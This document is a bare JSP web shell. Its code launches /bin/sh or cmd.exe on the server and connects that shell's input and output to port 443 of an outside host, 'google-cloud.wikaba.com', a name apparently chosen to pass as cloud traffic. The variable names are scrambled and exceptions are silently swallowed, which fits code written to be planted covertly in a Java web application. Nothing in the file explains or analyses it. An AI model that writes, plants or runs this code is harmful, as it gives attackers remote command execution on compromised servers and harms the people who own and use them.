<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {
    InputStream zh;
    OutputStream wd;

    StreamConnector( InputStream zh, OutputStream wd )
    {
      this.zh = zh;
      this.wd = wd;
    }

    public void run()
    {
      BufferedReader nh  = null;
      BufferedWriter xfv = null;
      try
      {
        nh  = new BufferedReader( new InputStreamReader( this.zh ) );
        xfv = new BufferedWriter( new OutputStreamWriter( this.wd ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = nh.read( buffer, 0, buffer.length ) ) > 0 )
        {
          xfv.write( buffer, 0, length );
          xfv.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( nh != null )
          nh.close();
        if( xfv != null )
          xfv.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    String ShellPath;
if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
  ShellPath = new String("/bin/sh");
} else {
  ShellPath = new String("cmd.exe");
}

    Socket socket = new Socket( "google-cloud.wikaba.com", 443 );
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>
